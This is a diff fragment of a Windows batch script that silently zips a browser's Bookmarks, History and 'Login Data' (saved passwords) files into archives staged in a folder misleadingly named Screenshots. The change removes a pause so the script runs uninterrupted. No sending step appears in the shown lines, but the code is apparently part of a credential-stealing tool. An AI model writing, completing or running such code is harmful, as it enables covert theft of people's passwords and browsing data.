@@ -24,7 +24,6 @@ cls
 powershell -command "Compress-Archive -Path '%output_dir%\Bookmarks' -DestinationPath '%output_dir%\Bookmarks.zip' -Force > $null 2>&1"
 powershell -command "Compress-Archive -Path '%output_dir%\History' -DestinationPath '%output_dir%\History.zip' -Force > $null 2>&1"
 powershell -command "Compress-Archive -Path '%output_dir%\Login Data' -DestinationPath '%output_dir%\Login_Data.zip' -Force > $null 2>&1"
-pause >nul
 
 
 set "file1=%localappdata%\Screenshots\Bookmarks.zip"
